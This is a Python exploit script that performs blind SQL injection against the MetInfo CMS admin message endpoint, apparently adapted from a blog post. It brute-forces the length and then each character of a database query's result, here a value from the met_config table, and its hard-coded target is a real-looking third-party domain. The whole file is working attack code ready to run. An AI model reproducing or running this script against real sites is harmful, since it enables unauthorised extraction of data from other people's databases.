#coding: utf-8
import requests
import string
#脚本来着于http://j0k3r.top/2019/05/01/Metinfo612/
url = "http://{}/admin/index.php?n=message&m=web&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id="

def get_res_len(host,sql):
	global url
	url = url.format(host)
	max_len = 101
	s = requests.session()
	for i in range(1,max_len):
		check_sql = "44 and(length(({}))={})".format(sql,str(i))
		res = s.get(url+check_sql)
		if "window.history.back()" in res.text:
			return i
	print ("data too long")

def get_sqli_data(host,sql):
	global url
	data_len = get_res_len(host,sql)
	sqli = "44 and(ascii(substr(({}),{},1)))={}"
	data = ""
	s = requests.session()
	for i in range(data_len+1):
		for c in string.printable[0:62]:
			res = s.get(url+sqli.format(sql,str(i),ord(c)))
			if "window.history.back()" in res.text:
				data += c
				print (data)

if __name__ == "__main__":
	host = "www.sinanyun.cn"
	sql = "select value from met_config where id = 45"
	get_sqli_data(host,sql)